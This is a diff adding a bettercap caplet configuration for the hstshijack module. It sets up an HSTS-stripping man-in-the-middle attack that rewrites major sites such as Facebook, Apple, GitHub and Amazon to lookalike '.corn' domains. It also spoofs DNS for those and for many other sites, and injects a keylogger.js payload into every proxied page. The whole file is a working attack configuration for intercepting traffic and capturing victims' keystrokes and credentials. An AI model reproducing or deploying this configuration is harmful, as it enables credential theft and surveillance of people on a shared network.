@@ -1,0 +1,14 @@
+set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.ignore          *
+set hstshijack.targets         twitter.com,*.twitter.com,facebook.com,*.facebook.com,apple.com,*.apple.com,ebay.com,*.ebay.com,*.instagram.com,instagram.com,*.github.com,github.com,*.tiktok.com,tiktok.com,amazon.com,*.amazon.com
+set hstshijack.replacements    twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,*.instagram.corn,instagram.corn,*.github.corn,github.corn,*.tiktok.corn,tiktok.corn,amazon.corn,*.amazon.corn
+set hstshijack.obfuscate       false
+set hstshijack.encode          false
+set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js 
+
+
+set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set dns.spoof.domains  twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,*.instagram.corn,instagram.corn,*.github.corn,github.corn,linkedin.com,*.linkedin.com,stackoverflow.com,*.stackoverflow.com,google.ie,*.google.ie,winzip.com,*.winzip.com,avg.com,*.avg.com,tiktok.corn,*.tiktok.corn,bbc.com,*.bbc.com,cnn.com,*.cnn.com,microsoft.com,*.microsoft.com,reddit.com,*.reddit.com,amazon.corn,*.amazon.corn
+
+http.proxy  on
+dns.spoof   on
